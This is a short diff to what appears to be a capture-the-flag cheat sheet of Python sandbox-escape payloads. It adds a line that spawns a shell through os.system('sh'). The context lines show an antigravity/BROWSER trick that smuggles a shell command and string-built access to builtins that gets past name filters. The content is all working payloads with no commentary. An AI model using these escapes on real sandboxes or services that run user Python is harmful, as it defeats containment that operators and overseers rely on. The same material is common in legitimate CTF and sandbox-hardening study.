@@ -14,6 +14,8 @@
 5. __import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='ls" #%s')))
 
 6. vars(vars()['__buil'+chr(116)+'ins__'])['prin'+chr(116)](_)
+
+7. __import__("os").system("sh") 
 ```
 
 
